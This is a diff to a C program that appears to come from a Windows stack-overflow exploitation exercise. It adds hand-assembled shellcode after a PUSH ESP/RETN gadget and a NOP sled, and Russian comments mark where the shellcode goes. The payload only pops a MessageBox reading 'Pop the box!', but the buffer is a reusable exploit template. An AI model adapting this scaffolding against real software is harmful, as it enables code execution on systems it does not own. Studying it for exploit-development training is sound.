@@ -158,6 +158,21 @@ int _tmain(int argc, _TCHAR* argv[])
 		//"XXXYYYZZZ123" // # Перепрыгнем, изменив указатель
 		"\x30\x5C\x34\x7C" // # PUSH ESP / RETN
 		"\x90\x90\x90\x90" //с этого места начинается ваш шелл код
+"\x33\xc0"                          // XOR EAX,EAX
+"\x50"                              // PUSH EAX      => padding for lpCaption
+"\x68\x62\x33\x33\x66"              // PUSH "b33f"
+"\x8B\xCC"                          // MOV ECX,ESP   => PTR to lpCaption
+"\x50"                              // PUSH EAX      => padding for lpText
+"\x68\x62\x6F\x78\x21"              // PUSH "box!"
+"\x68\x74\x68\x65\x20"              // PUSH "the "
+"\x68\x50\x6F\x70\x20"              // PUSH "Pop "
+"\x8B\xD4"                          // MOV EDX,ESP   => PTR to lpText
+"\x50"                              // PUSH EAX - uType=0x0
+"\x51"                              // PUSH ECX - lpCaption
+"\x52"                              // PUSH EDX - lpText
+"\x50"                              // PUSH EAX - hWnd=0x0
+"\xBE\x71\xEA\xA4\x76"              // MOV ESI,USER32.MessageBoxA
+"\xFF\xD6"                         // CALL ESI
 ); 
 return 0;
 }
